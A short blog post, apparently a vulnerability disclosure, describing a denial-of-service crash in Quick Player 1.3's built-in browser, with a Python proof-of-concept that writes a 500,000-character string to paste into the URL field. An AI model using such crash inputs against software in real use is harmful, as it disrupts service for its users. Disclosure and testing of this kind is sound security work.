---
layout: post
title: Quick Player 1.3 - "Browser.exe" Denial of Service
date: 2020-03-26 14:45:00
categories: posts
comments: false
en: true
---

# The Bug

Quick Player suffers a Denial of Service within a sub application, which purpose is to act as a web browser. If a length string is parsed through the url parameter, the application will crash.
Although it is possible to cause a crash, i was not able to exploit the application through a memory corruption vulnerability, as it is compressed, and it would crash the debugger as well.

PoC code:

```term
buffer = "A" * 500000

f = open ("poc.txt", "w")

f.write(buffer)

f.close()
```

In order to exploit the application, open "Browser.exe" and insert the generated string by the script:

![](/assets/img/Findings7/1.png)

# Proof

![](/assets/img/Findings7/2.gif)
